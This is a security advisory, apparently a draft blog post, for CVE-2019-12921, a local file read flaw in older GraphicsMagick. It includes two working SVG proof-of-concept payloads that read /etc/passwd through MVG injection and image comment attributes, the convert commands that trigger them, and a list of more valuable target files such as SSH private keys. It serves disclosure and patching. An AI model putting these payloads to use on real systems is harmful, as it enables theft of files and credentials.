---
title: "Data Processing Libraries. Part II"
date: 2020-02-24T13:20:48+01:00
draft: true
---

# CVE-2019-12921
- Title:         Arbitary file read at TranslateTextEx GraphicsMagick before 1.3.32
- Scope:         http://hg.code.sf.net/p/graphicsmagick/code/
- Weakness:      Information Disclosure
- Severity:      High
- Date:          2019-06-24 12:21:30 +0000
- By:            @d4d

### Arbitary file read at TranslateTextEx GraphicsMagick before 1.3.32

Local file read vulnerability affects GraphicsMagick multiple decoders that may use MVG syntaxis by default. Malicious user can get access to the local file content.
To exploit this vulnerability untrusted user file should be converted to another format with command:

```bash
gm convert exploit.svg output.png
```

exploit.svg is:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1"
	xmlns="http://www.w3.org/2000/svg" xmlns:xlink= "http://www.w3.org/1999/xlink">
	<image 
	xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png' text 128,128 '@/etc/passwd" 
	x="0" y="0" height="137px" width="137px"/>
</svg>
```

Exploit inject custom TextPrimitive inside ImagePrimitive at MVG coder. SVG coder when reads xlink:href attribute do not properly escape ' and any MVG commands can be injected. Function AnnotateImage(annotate.c) reads text from file with TranslateTextEx that accepts '@' as local file.

Malicious user can exploit this vulnerability at image attributes generation process for SVG coder too. 
Attributes generation process at some of the images such as SVG have issue that may allow malicious user read any local file contents.

```bash
gm convert exploit.svg output.png
```

exploit.svg is:

```xml
<?xml version="1.0" standalone="no"?>
<!--@/etc/passwd-->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink= " http://www.w3.org/1999/xlink"> <image 
	xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
	x="0" y="0" height="137px" width="137px"/></svg>
```

Function SetImageAttribute(Image *image,const char *key,const char *value) do not properly translate comments and label for this image that allow attacker to get file contents when image attributes will be written for image formats like JPEG and GIF. To reproduce vulnerability convert image:
`gm convert exploit.svg output.gif`
`gm convert exploit.svg output.jpeg`
Image attributes (comments section) will contains file contents.

### Timeline
- Reported to project maintainers: 6 Jun 2019
- Acknowledged: 6 June 2019
- Patched: 6 June 2019
- Released: 15 June 2019
- CVE Assigned: 20 June 2019
- Advisory confirmed by project maintainers: 20 June 2019

### Impact

We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to the ssh private keys used for host authentication or ssh private keys without a password are more useful.  Passwords are often baked into files such as Mercurial's hgrc file.  X11's .Xauthority file might be useful on an active desktop system.
